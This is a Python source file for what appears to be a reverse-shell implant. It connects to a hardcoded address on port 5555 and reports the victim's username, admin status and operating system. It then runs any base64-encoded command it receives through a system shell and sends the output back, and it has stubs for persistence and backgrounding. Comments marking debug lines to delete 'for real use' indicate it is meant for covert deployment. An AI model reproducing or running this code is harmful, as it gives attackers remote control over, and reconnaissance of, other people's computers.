import socket
import subprocess
import os
import ctypes
import platform
import time
import base64



def inbound_comm(): # Handle inbound comunications and decode to str from bytes
    print(f'[+] Awaiting response from server...')
    message = ''
    while True:
        try: 
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except Exception:
            print(f'[-] An exception occured')
            sock.close()

def outbound_comm(message): #Handle outgoing comms - sending response to server 
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf-8'))
    sock.send(response)

def session_handler(): # Handle the sessions, connections, port etc - handle implate functionality as well
    try:

        print(f'[+] Trying to connect to {host_ip}') #Delete for real use
        sock.connect((host_ip,host_port))
        outbound_comm(os.getlogin())
        outbound_comm(ctypes.windll.shell32.IsUserAnAdmin())
        time.sleep(1)
        operating_system = platform.uname()
        operating_system = (f'{operating_system[0]} {operating_system[2]}')
        outbound_comm(operating_system)
        print(f'[+] Connected to {host_ip}') #Delete 

        while True:
            message = inbound_comm()
            print(message) #Delete
            if message == 'exit':
                print('[-] The server terminated the session...') #DELETE
                sock.close()
                break
            elif message == 'persist':
                pass
            elif message.split(" ")[0] == 'cd': #split message on space and see if index 0 == cd
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed dir to {cur_dir}')
                    sock.send(cur_dir.encode())
                except FileNotFoundError:
                    outbound_comm('[-] Directory not found')
                    continue
            elif message == 'background':
                pass
            elif message == 'help':
                pass
            else:
                #subprocess shell handling
                command = subprocess.Popen(message, shell=True, stdout =subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound_comm(output.decode())      
    except ConnectionRefusedError:
        pass
                
      

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = '192.168.1.218'
    host_port = 5555
    session_handler()


